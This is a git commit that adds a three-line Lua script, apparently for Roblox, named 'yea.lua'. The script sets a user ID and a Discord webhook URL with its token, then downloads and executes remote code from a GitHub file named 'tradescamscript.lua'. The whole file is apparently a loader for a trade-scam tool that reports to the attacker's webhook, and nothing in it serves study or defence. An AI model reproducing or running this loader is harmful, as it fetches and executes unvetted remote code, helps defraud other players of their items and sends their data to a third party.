79d3be20783ab75d394d4e052a0d1490ede0dead
kezulox <65214003+kezulox@users.noreply.github.com>
2022-12-11 05:47:44 -0600

    Create yea.lua

---
+++ yea.lua
@@ -0,0 +1,3 @@
+_G.UserID = 4125135045
+_G.WebHook = "https://canary.discord.com/api/webhooks/1051348058115420210/XEk-iAay5Ky_ci4pmBrkbWZKtToE85L2uDVjdZ50pj7FsNu85SEtI7spPZDk74NWgGcN"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kezulox/scripts/main/tradescamscript.lua'))()
